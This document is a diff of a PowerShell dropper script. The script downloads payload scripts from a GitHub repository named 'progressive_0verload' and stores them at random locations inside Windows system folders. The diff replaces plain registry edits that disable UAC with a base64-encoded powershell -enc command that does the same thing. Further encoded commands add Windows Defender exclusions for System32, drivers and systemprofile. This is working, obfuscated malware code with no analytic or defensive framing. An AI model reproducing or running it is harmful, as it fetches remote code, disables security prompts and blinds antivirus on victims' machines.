@@ -1,28 +1,7 @@
 $initServiceRootmonmonUri = "https://github.com/Soumyo001/progressive_0verload/raw/refs/heads/main/payloads/init_service_rootmonmon.ps1"
 $initServiceFwdmonUri = "https://github.com/Soumyo001/progressive_0verload/raw/refs/heads/main/payloads/init_service_fwdmon.ps1"
 $currLoc = $MyInvocation.MyCommand.Path
-$paths = @(
-    "$env:windir\system32\config\systemprofile\AppData\Local",
-    "$env:windir\System32",
-    "$env:windir\System32\drivers",
-    "$env:windir\System32\en-US",
-    "$env:windir\System32\LogFiles\WMI",
-    "$env:windir\System32\wbem\en-US",
-    "C:\Recovery",
-    "$env:temp",
-    "$env:ProgramData",
-    "$env:windir\SysWOW64",
-    "$env:appdata\SystemInformer",
-    "$env:localappdata\Microsoft\Windows",
-    "$env:windir\System32\WindowsPowerShell\v1.0\Modules",
-    "$env:windir\System32\drivers\etc",
-    "$env:windir\WinSxS",
-    "$env:windir\System32\spool\drivers\x64\3\en-US",
-    "$env:windir\System32\spool",
-    "$env:windir\System32\catroot2",
-    "$env:windir\ServiceProfiles\LocalService\AppData\Local\Microsoft\Windows\WinX",
-    "$env:windir\ServiceProfiles\NetworkService"
-)
+$paths = @("$env:windir\system32\config\systemprofile\AppData\Local","$env:windir\System32","$env:windir\System32\drivers","$env:windir\System32\en-US","$env:windir\System32\LogFiles\WMI","$env:windir\System32\wbem\en-US","C:\Recovery","$env:temp","$env:ProgramData","$env:windir\SysWOW64","$env:appdata\SystemInformer","$env:localappdata\Microsoft\Windows","$env:windir\System32\WindowsPowerShell\v1.0\Modules","$env:windir\System32\drivers\etc","$env:windir\WinSxS","$env:windir\System32\spool\drivers\x64\3\en-US","$env:windir\System32\spool","$env:windir\System32\catroot2","$env:windir\ServiceProfiles\LocalService\AppData\Local\Microsoft\Windows\WinX","$env:windir\ServiceProfiles\NetworkService")
 $initServiceRootmonmonPath = $paths[$(Get-Random -Minimum 0 -Maximum $paths.Length)]
 $initServiceRootmonmonPath = "$initServiceRootmonmonPath\init_service_rootmonmon.ps1"
 $initServiceFwdmonPath = $paths[$(Get-Random -Minimum 0 -Maximum $paths.Length)]
@@ -66,9 +45,7 @@ iwr -Uri $initServiceFwdmonUri -OutFile $initServiceFwdmonPath
 
 
 
-Set-ItemProperty -Path HKLM:Software\Microsoft\Windows\CurrentVersion\policies\system -Name EnableLUA -Type DWord -Value 0 -Force
-Set-ItemProperty -Path HKLM:Software\Microsoft\Windows\CurrentVersion\policies\system -Name ConsentPromptBehaviorAdmin -Type DWord -Value 0 -Force
-Set-ItemProperty -Path HKLM:Software\Microsoft\Windows\CurrentVersion\policies\system -Name PromptOnSecureDesktop -Type DWord -Value 0 -Force
+powershell -enc "UwBlAHQALQBJAHQAZQBtAFAAcgBvAHAAZQByAHQAeQAgAC0AUABhAHQAaAAgAEgASwBMAE0AOgBTAG8AZgB0AHcAYQByAGUAXABNAGkAYwByAG8AcwBvAGYAdABcAFcAaQBuAGQAbwB3AHMAXABDAHUAcgByAGUAbgB0AFYAZQByAHMAaQBvAG4AXABwAG8AbABpAGMAaQBlAHMAXABzAHkAcwB0AGUAbQAgAC0ATgBhAG0AZQAgAEUAbgBhAGIAbABlAEwAVQBBACAALQBUAHkAcABlACAARABXAG8AcgBkACAALQBWAGEAbAB1AGUAIAAwACAALQBGAG8AcgBjAGUADQAKAFMAZQB0AC0ASQB0AGUAbQBQAHIAbwBwAGUAcgB0AHkAIAAtAFAAYQB0AGgAIABIAEsATABNADoAUwBvAGYAdAB3AGEAcgBlAFwATQBpAGMAcgBvAHMAbwBmAHQAXABXAGkAbgBkAG8AdwBzAFwAQwB1AHIAcgBlAG4AdABWAGUAcgBzAGkAbwBuAFwAcABvAGwAaQBjAGkAZQBzAFwAcwB5AHMAdABlAG0AIAAtAE4AYQBtAGUAIABDAG8AbgBzAGUAbgB0AFAAcgBvAG0AcAB0AEIAZQBoAGEAdgBpAG8AcgBBAGQAbQBpAG4AIAAtAFQAeQBwAGUAIABEAFcAbwByAGQAIAAtAFYAYQBsAHUAZQAgADAAIAAtAEYAbwByAGMAZQANAAoAUwBlAHQALQBJAHQAZQBtAFAAcgBvAHAAZQByAHQAeQAgAC0AUABhAHQAaAAgAEgASwBMAE0AOgBTAG8AZgB0AHcAYQByAGUAXABNAGkAYwByAG8AcwBvAGYAdABcAFcAaQBuAGQAbwB3AHMAXABDAHUAcgByAGUAbgB0AFYAZQByAHMAaQBvAG4AXABwAG8AbABpAGMAaQBlAHMAXABzAHkAcwB0AGUAbQAgAC0ATgBhAG0AZQAgAFAAcgBvAG0AcAB0AE8AbgBTAGUAYwB1AHIAZQBEAGUAcwBrAHQAbwBwACAALQBUAHkAcABlACAARABXAG8AcgBkACAALQBWAGEAbAB1AGUAIAAwACAALQBGAG8AcgBjAGUA"
 powershell -enc "cgBlAGcAIABhAGQAZAAgACIASABLAEwATQBcAFMATwBGAFQAVwBBAFIARQBcAFAAbwBsAGkAYwBpAGUAcwBcAE0AaQBjAHIAbwBzAG8AZgB0AFwAVwBpAG4AZABvAHcAcwAgAEQAZQBmAGUAbgBkAGUAcgBcAEUAeABjAGwAdQBzAGkAbwBuAHMAXABQAGEAdABoAHMAIgAgAC8AdgAgACIAQwA6AFwAVwBpAG4AZABvAHcAcwBcAHMAeQBzAHQAZQBtADMAMgBcAGMAbwBuAGYAaQBnAFwAcwB5AHMAdABlAG0AcAByAG8AZgBpAGwAZQBcAEEAcABwAEQAYQB0AGEAXABMAG8AYwBhAGwAIgAgAC8AZgA="
 powershell -enc "cgBlAGcAIABhAGQAZAAgACIASABLAEwATQBcAFMATwBGAFQAVwBBAFIARQBcAFAAbwBsAGkAYwBpAGUAcwBcAE0AaQBjAHIAbwBzAG8AZgB0AFwAVwBpAG4AZABvAHcAcwAgAEQAZQBmAGUAbgBkAGUAcgBcAEUAeABjAGwAdQBzAGkAbwBuAHMAXABQAGEAdABoAHMAIgAgAC8AdgAgACIAQwA6AFwAVwBpAG4AZABvAHcAcwBcAFMAeQBzAHQAZQBtADMAMgAiACAALwBmAA=="
 powershell -enc "cgBlAGcAIABhAGQAZAAgACIASABLAEwATQBcAFMATwBGAFQAVwBBAFIARQBcAFAAbwBsAGkAYwBpAGUAcwBcAE0AaQBjAHIAbwBzAG8AZgB0AFwAVwBpAG4AZABvAHcAcwAgAEQAZQBmAGUAbgBkAGUAcgBcAEUAeABjAGwAdQBzAGkAbwBuAHMAXABQAGEAdABoAHMAIgAgAC8AdgAgACIAQwA6AFwAVwBpAG4AZABvAHcAcwBcAFMAeQBzAHQAZQBtADMAMgBcAGQAcgBpAHYAZQByAHMAIgAgAC8AZgA="
